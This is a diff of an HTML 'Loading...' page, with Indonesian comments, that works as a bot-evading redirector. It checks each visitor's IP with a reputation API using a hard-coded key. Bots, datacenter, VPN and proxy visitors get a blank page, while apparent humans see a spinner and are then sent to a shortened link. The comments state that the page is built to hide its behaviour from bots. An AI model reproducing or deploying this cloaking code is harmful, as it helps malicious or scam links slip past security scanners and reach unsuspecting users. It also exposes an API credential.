@@ -3,24 +3,81 @@
 <head>
   <meta charset="utf-8">
   <title>Loading...</title>
-  <script>
-  (async () => {
-    const TARGET_URL = "https://o2o.to/i/HEQFWR1SPN94"; // 
-    const API_KEY = "e8035f4f-bdb7-4fbc-aaca-ba226fa2c064";
-
-    try {
-      const r = await fetch("https://api.ipdetective.io/ip?info=true", {
-        headers: { "x-api-key": API_KEY }
-      });
-      if (!r.ok) return; 
-      const j = await r.json();
-      const t = (j.type || "").toLowerCase();
-      if (j.bot || ["datacenter", "bot", "vpn", "proxy"].includes(t)) return;
-      location.replace(TARGET_URL); // 
-    } catch (e) {}
-  })();
-  </script>
 </head>
-<body></body>
-</html>
+<body>
+<script>
+(async () => {
+  const TARGET_URL = "https://o2o.to/i/HEQFWR1SPN94";
+  const API_KEY = "e8035f4f-bdb7-4fbc-aaca-ba226fa2c064";
 
+  try {
+    const r = await fetch("https://api.ipdetective.io/ip?info=true", {
+      headers: { "x-api-key": API_KEY, "Accept": "application/json" },
+      cache: "no-store",
+      credentials: "omit"
+    });
+    if (!r || !r.ok) return; // gagal -> blank (untouched for bots)
+
+    const j = await r.json().catch(() => ({}));
+    const t = (j.type || "").toLowerCase();
+    const isBot = j.bot === true || ["datacenter", "bot", "vpn", "proxy"].includes(t);
+    if (isBot) return; // bot -> tetap blank (tidak diubah)
+
+    // human -> tampilkan spinner merah kemudian redirect
+    showSpinnerAndRedirect(TARGET_URL);
+  } catch (e) {
+    // error -> blank (tidak diubah)
+  }
+
+  // buat spinner di runtime agar bots tidak melihatnya sebelum verifikasi
+  function showSpinnerAndRedirect(url) {
+    // container
+    const wrap = document.createElement('div');
+    wrap.id = 'c9-spinner-wrap';
+    Object.assign(wrap.style, {
+      position: 'fixed',
+      inset: '0',
+      display: 'flex',
+      alignItems: 'center',
+      justifyContent: 'center',
+      background: 'white',
+      zIndex: '99999'
+    });
+
+    // spinner (red)
+    const spinner = document.createElement('div');
+    spinner.id = 'c9-spinner';
+    Object.assign(spinner.style, {
+      width: '70px',
+      height: '70px',
+      borderRadius: '50%',
+      border: '6px solid rgba(0,0,0,0.06)',
+      borderTop: '6px solid #d32f2f', // merah
+      boxSizing: 'border-box',
+      animation: 'c9-spin 1s linear infinite'
+    });
+
+    // optional text (hidden for minimal UI) - not required
+    // const txt = document.createElement('div');
+    // txt.textContent = 'Loading...';
+    // Object.assign(txt.style, { marginTop: '12px', color: '#333', fontFamily: 'sans-serif', fontSize: '14px' });
+
+    wrap.appendChild(spinner);
+    // wrap.appendChild(txt);
+    document.body.appendChild(wrap);
+
+    // inject keyframes
+    const styleEl = document.createElement('style');
+    styleEl.textContent = '@keyframes c9-spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}';
+    document.head.appendChild(styleEl);
+
+    // beri waktu singkat agar spinner terlihat, lalu redirect
+    // (500ms cukup untuk flash spinner; ubah jika perlu)
+    setTimeout(() => {
+      location.replace(url);
+    }, 500);
+  }
+})();
+</script>
+</body>
+</html>
